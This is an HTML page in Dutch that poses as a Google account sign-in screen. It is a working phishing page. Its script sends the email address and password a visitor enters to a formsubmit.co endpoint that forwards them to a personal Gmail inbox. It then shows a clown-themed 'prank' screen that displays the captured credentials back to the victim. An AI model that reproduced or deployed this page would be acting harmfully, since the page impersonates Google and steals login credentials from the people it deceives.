<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box, .prank-box { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .google-logo { height: 24px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-top: 10px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; margin-top: 20px; }
        #loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .prank-box { display: none; }
        .data-reveal { background: #f8f9fa; padding: 15px; border-radius: 6px; text-align: left; margin: 20px 0; border-left: 5px solid #ff0000; }
    </style>
</head>
<body>

    <div id="loginPage" class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
        <h1>Inloggen</h1>
        <p>Gebruik je Google-account</p>
        
        <form action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST" id="googleForm">
            <input type="email" name="email" id="email" placeholder="E-mailadres" required>
            <input type="password" name="password" id="pass" placeholder="Wachtwoord" minlength="6" required>
            
            <input type="hidden" name="_captcha" value="false">
            
            <div id="loader"></div>
            <button type="submit" id="submitBtn">Volgende</button>
        </form>
    </div>

    <div id="prankPage" class="prank-box">
        <div style="font-size: 60px;">🤡</div>
        <h1>thx voor je inloggegevens!</h1>
        <p>thx</b>.</p>
        <div class="data-reveal">
            <strong>E-mail:</strong> <span id="displayEmail"></span><br>
            <strong>Wachtwoord:</strong> <span id="displayPass"></span>
        </div>
        <p>Check je mailbox, Dolphin0X... daar staat het nu ook! 😉</p>
    </div>

    <script>
        document.getElementById('googleForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const formData = new FormData(this);

            btn.style.display = 'none';
            loader.style.display = 'block';

            // Verzend de data naar FormSubmit
            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('prankPage').style.display = 'block';
                document.getElementById('displayEmail').innerText = document.getElementById('email').value;
                document.getElementById('displayPass').innerText = document.getElementById('pass').value;
            });
        });
    </script>
</body>
</html>
